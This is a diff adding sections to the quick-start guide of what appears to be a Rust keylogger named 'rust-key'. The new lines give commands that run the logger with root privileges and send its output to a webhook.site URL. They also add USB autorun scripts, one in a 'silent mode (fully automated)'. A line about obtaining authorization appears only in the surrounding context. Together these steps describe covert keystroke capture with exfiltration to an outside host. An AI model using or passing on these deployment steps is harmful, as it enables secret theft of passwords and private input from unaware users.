@@ -78,11 +78,29 @@ sudo ./target/release/rust-key
 
 ## Quick Tips
 
+### Test Webhook Before Use
+```bash
+# Test your webhook URL first
+./test_webhook.sh https://webhook.site/your-unique-id
+
+# Then run with webhook
+sudo ./target/release/rust-key https://webhook.site/your-unique-id
+```
+
 ### Run without sudo (optional)
 ```bash
 sudo usermod -a -G input $USER
 # Log out and log back in, then:
 ./target/release/rust-key
+```
+
+### USB Deployment
+```bash
+# Interactive mode (with prompts)
+./usb_autorun.sh
+
+# Silent mode (fully automated)
+sudo ./usb_autorun_silent.sh [WEBHOOK_URL]
 ```
 
 ### USB Keyboard Detection
@@ -173,9 +191,11 @@ Always obtain proper authorization and comply with local laws.
 ## Next Steps
 
 For more detailed information, see:
+- **QUICKREF.md** - Quick command reference for common tasks
 - **README.md** - Full feature list and overview
 - **INSTALL.md** - Detailed installation for all platforms
 - **USAGE.md** - Advanced usage and examples
+- **USB_SETUP.md** - USB deployment guide
 - **TESTING.md** - Testing and verification procedures
 
 ## Support
